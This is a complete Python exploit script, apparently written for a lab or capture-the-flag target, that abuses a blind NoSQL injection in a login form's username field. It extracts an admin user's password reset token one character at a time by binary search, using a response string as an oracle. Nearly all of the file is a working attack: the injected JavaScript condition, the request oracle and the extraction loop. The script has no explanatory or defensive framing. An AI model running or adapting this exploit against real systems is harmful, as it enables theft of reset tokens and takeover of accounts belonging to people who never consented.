#!/usr/bin/env python3

import requests
from urllib.parse import quote_plus
####
####

# Target URL for the login attempt
URL_LOGIN = "http://12.12.12.12:6699/login"  # Replace with your actual target URL
USERNAME = "admin"  # Target username for which we're retrieving the reset token
TOKEN_LENGTH = 24   # Length of the token we're trying to retrieve

def oracle(query):
    """
    Sends a request with the provided NoSQL injection query to check if the response contains
    a known indicator for valid or invalid credentials.
    """
    response = requests.post(
        URL_LOGIN,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=f"username={quote_plus(query)}&password=doesNotMatterIamBypassed"
    )
    # Return True if the "credentials." indicator is present, meaning injection was successful
    return "credentials." in response.text

def retrieve_token():
    """
    Uses binary search on each character's ASCII value to guess the 24-character reset token.
    """
    password_reset_token = ""
    print("[INFO] Starting token retrieval using binary search...")

    for position in range(TOKEN_LENGTH):
        low, high = 45, 90  # ASCII range for characters used in the token
        print(f"[INFO] Determining character at position {position + 1}...")

        while low <= high:
            mid = (low + high) // 2
            # Inject to check if the character at the current position is greater than `mid`
            if oracle(f'" || (this.username == "{USERNAME}" && this.token.charCodeAt({position}) > {mid}) || "" != "'):
                low = mid + 1
            # Inject to check if the character at the current position is less than `mid`
            elif oracle(f'" || (this.username == "{USERNAME}" && this.token.charCodeAt({position}) < {mid}) || "" != "'):
                high = mid - 1
            else:
                # If neither is true, we have found the correct character
                password_reset_token += chr(mid)
                print(f"[INFO] Character found: {chr(mid)} at position {position + 1}")
                break

    return password_reset_token

if __name__ == "__main__":
    try:
        token = retrieve_token()
        if token:
            print(f"[SUCCESS] Retrieved password reset token: {token}")
        else:
            print("[ERROR] Failed to retrieve the token.")
    except Exception as e:
        print(f"[ERROR] An exception occurred: {e}")

####
####
